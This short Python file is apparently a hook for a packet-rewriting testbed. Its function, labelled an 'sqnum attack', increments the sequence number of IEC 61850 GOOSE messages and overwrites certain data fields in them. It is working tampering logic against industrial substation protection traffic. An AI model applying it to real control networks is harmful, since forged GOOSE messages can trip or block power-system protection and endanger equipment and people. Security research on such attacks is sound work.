#This where your code is run on the packet's recieved

from .aSDIP_Header import LFC
import pyshark

# to change a piece of data, you need to create a new object and assign it to the field
# the LFC(str) function is provided to do that
# an example:

#   #variable change assigned object with string "8000" passed through 
#   #i.e change it to an IP type packet
#   inpacket.eth.type_raw[0].raw_data=LFC("8000")

def yourcode(inpacket):  
    #sqnum attack
    print("Original sqNum " + inpacket.goose.goosePdu_element.sqNum_raw[0])
    c=int(inpacket.goose.goosePdu_element.sqNum_raw[0],16)+1 ##convert to int to increment
    c=format(c,'x') #format back to hex

    d=""
    for i in range(0,len(inpacket.goose.goosePdu_element.sqNum_raw[0])-len(str(c))):
        d+="0" ##this padds with zeros based on length
    d+=str(c) #finishes off the string


    inpacket.goose.goosePdu_element.sqNum_raw[0]=LFC(d)
    print("New sqNum " + inpacket.goose.goosePdu_element.sqNum_raw[0])

    #change some data

    #print(inpacket.goose.goosePdu_element.allData_tree.Data_raw)
    for element in inpacket.goose.goosePdu_element.allData_tree.Data_raw:
        if (element[2]=='2'):
            print("Found data of length 2")
            
            pad=str(element[0][0])+'4'
            pad+='10'

            element[0]=LFC(pad)
            print("Data changed to " +pad)

            
    return 